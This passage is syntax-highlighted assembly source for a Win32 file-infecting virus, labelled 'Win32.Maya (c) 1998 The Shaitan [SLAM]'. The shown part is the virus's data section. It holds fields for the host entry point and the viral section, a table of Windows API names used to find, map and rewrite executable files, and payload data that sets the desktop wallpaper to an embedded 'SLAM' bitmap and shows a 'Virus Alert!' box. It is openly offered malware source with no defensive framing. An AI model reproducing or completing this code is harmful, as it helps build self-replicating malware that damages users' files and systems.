</span><span class="sc5">maya_filealign</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;file alignment unit size   @1B90</span><span class="sc0">
</span><span class="sc5">maya_entry_of_host</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">    </span><span class="sc1">;host entry rva  @1B94</span><span class="sc0">
</span><span class="sc1">; yikes--hardcoded for 1st generation:)</span><span class="sc0">

</span><span class="sc5">maya_sectrva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;rva of viral section    @1B98</span><span class="sc0">
</span><span class="sc5">maya_olderva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;temporary storage of host entry point @1B9C</span><span class="sc0">
</span><span class="sc5">maya_sectps</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;PhysSize of last section @1BA0</span><span class="sc0">
</span><span class="sc5">maya_k32</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;@1BA4</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;api names</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_getmodulehandlea_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">       </span><span class="sc1">;@1BB1</span><span class="sc0">
</span><span class="sc5">maya_getmodulehandlea</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getmodulehandlea_add</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_getprocaddress_len</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">maya_getprocaddress</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getprocaddress_add</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_createfilea_len</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">maya_createfilea</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_createfilea_add</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_writefile_len</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">maya_writefile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_writefile_add</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_getfilesize_len</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">maya_getfilesize</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getfilesize_add</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_createfilemappinga_len</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">maya_createfilemappinga</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_createfilemappinga_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_mapviewoffile_len</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">maya_mapviewoffile</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_mapviewoffile_add</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_unmapviewoffile_len</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">maya_unmapviewoffile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_unmapviewoffile_add</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_closehandle_len</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">maya_closehandle</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_closehandle_add</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_findfirstfilea_len</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">maya_findfirstfilea</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_findfirstfilea_add</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_findnextfilea_len</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">maya_findnextfilea</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_findnextfilea_add</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_findclose_len</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">maya_findclose</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_findclose_add</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_setfilepointer_len</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">maya_setfilepointer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_setfilepointer_add</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_setendoffile_len</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">maya_setendoffile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_setendoffile_add</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_getcurrentdirectorya_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">
</span><span class="sc5">maya_getcurrentdirectorya</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getcurrentdirectorya_add</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_setcurrentdirectorya_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">
</span><span class="sc5">maya_setcurrentdirectorya</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_setcurrentdirectorya_add</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_getfileattributesa_len</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">maya_getfileattributesa</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getfileattributesa_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_setfileattributesa_len</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">maya_setfileattributesa</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_setfileattributesa_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_getsystemtime_len</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">maya_getsystemtime</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getsystemtime_add</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_getwindowsdirectorya_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">
</span><span class="sc5">maya_getwindowsdirectorya</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getwindowsdirectorya_add</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maya_maya</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'MAYA'</span><span class="sc0">   </span><span class="sc1">;endmarker</span><span class="sc0">

</span><span class="sc5">maya_movefilea_len</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">maya_movefilea</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MoveFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_movefilea_add</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call1</span><span class="sc0">

</span><span class="sc5">maya_copyfilea_len</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">maya_copyfilea</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CopyFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_copyfilea_add</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call2</span><span class="sc0">

</span><span class="sc5">maya_createfilea2_len</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">maya_createfilea2</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_createfilea2_add</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call3</span><span class="sc0">

</span><span class="sc5">maya_deletefilea_len</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">maya_deletefilea</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DeleteFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_deletefilea_add</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call4</span><span class="sc0">

</span><span class="sc5">maya_setfileattributesa2_len</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">maya_setfileattributesa2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_setfileattributesa2_add</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call5</span><span class="sc0">

</span><span class="sc5">maya_getfileattributesa2_len</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">maya_getfileattributesa2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getfileattributesa2_add</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call6</span><span class="sc0">

</span><span class="sc5">maya_getfullpathnamea_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
</span><span class="sc5">maya_getfullpathnamea</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFullPathNameA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_getfullpathnamea_add</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call7</span><span class="sc0">

</span><span class="sc5">maya_createprocessa_len</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">maya_createprocessa</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_createprocessa_add</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_call8</span><span class="sc0">

</span><span class="sc5">maya_shai</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc12">'SHAI'</span><span class="sc0">   </span><span class="sc1">;endmarker</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;payload stuff</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">maya_cpd</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Control Panel\Desktop'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_reg</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@1E76</span><span class="sc0">
</span><span class="sc5">maya_one</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'1'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@1E7A</span><span class="sc0">
</span><span class="sc5">maya_zero</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@1E7C</span><span class="sc0">
</span><span class="sc5">maya_tilewallpaper</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TileWallpaper'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;@1E7E</span><span class="sc0">
</span><span class="sc5">maya_wallpaperstyle</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WallpaperStyle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_slamfilename</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SLAM.BMP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;@1E9B</span><span class="sc0">
</span><span class="sc5">maya_slamhandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;handle of created SLAM.BMP @1EA4</span><span class="sc0">
</span><span class="sc5">maya_numberofwritten</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;paramter of WriteFile</span><span class="sc0">
</span><span class="sc5">maya_mayamsg</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Maya (c) 1998 The Shaitan [SLAM]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_viralert</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Virus Alert!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_user32</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;@1EE0</span><span class="sc0">
</span><span class="sc5">maya_advapi32</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ADVAPI32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;@1EEB</span><span class="sc0">
</span><span class="sc5">maya_u32hand</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;handle to user32 @1EF8</span><span class="sc0">
</span><span class="sc5">maya_a32hand</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;handle to advapi32 @1EFC</span><span class="sc0">
</span><span class="sc5">maya_dd5</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;????       @1F00</span><span class="sc0">
</span><span class="sc5">maya_regopenkeyexa</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegOpenKeyExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;@1F04</span><span class="sc0">
</span><span class="sc5">maya_regsetvalueexa</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegSetValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_messageboxa</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_sysparam</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SystemParametersInfoA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maya_regopenkeyexa_add</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;add of fn  @1F43</span><span class="sc0">
</span><span class="sc5">maya_regsetvalueexa_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;add of fn  @1F47</span><span class="sc0">
</span><span class="sc5">maya_messageboxa_add</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;add of fn  @1F4B</span><span class="sc0">
</span><span class="sc5">maya_sysparam_add</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;add of fn  @1F4F</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;the 'SLAM' logo stored in bitmap file format</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">slam_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">230</span><span class="sc0">    </span><span class="sc1">;@1F53</span><span class="sc0">
</span><span class="sc5">slam</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">66</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77</span><span class="sc4">,</span><span class="sc2">230</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">168</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">196</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">196</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc0">
